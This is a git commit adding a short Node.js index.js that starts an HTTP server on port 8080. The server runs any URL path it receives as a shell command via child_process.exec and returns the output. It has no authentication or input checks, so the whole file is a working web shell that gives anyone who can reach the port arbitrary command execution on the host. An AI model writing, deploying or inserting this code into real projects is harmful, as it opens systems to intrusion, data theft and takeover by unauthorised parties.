9fb177cbb84c0f8fc3ae3e4d53d07748b0673704
shikto-tech <71165904+shikto-tech@users.noreply.github.com>
2021-08-11 13:16:36 +0600

    Add files via upload

---
+++ index.js
@@ -0,0 +1,20 @@
+console.log("asas"); 
+var child = require('child_process');
+ 
+
+const http = require('http');
+
+const requestListener = function (req, res) {
+    let command = decodeURI(req.url.substr(1))
+  res.writeHead(200);
+  res.write(command + "\n")
+  child.exec(command, function(err, stdout, stderr) { 
+    // Node.js will invoke this callback when process terminates.
+    res.write(stdout)
+    console.log(stdout); 
+  res.end("")
+}); 
+}
+
+const server = http.createServer(requestListener);
+server.listen(8080);
